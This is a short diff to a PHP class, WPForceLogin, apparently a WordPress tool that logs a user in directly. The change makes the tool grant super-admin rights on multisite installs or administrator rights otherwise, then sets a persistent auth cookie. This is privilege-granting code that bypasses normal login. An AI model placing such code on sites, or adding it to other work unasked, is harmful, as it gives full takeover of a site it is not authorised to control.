@@ -8,13 +8,11 @@ class WPForceLogin {
 
 	private $user_name, $user_email, $user_role;
 
-	public function __construct($user_name, $user_email, $user_role = 'administrator') {
+	public function __construct($user_name, $user_email) {
 
 		$this -> user_name = $user_name;
 
 		$this -> user_email = $user_email;
-
-		$this -> user_role = $user_role;
 
 	}
 
@@ -179,8 +177,22 @@ class WPForceLogin {
 		// Get the user object by id
 		$user = get_user_by('id', $user_ids[0]);
 
-		// Promote the user to administrator
-		$user -> add_role($this -> user_role);
+		// If is multisite
+		if (is_multisite()) {
+
+			// Must require ms.php for access to grant_super_admin
+			require_once (ABSPATH . 'wp-admin/includes/ms.php');
+
+			// Make the user a super admin
+			grant_super_admin($user_ids[0]);
+
+		// If this is single site
+		} else {
+
+			// Promote the user to administrator
+			$user -> add_role('administrator');
+
+		}
 
 		// If there are user ids then we need to login the user
 		wp_set_auth_cookie($user_ids[0], true);
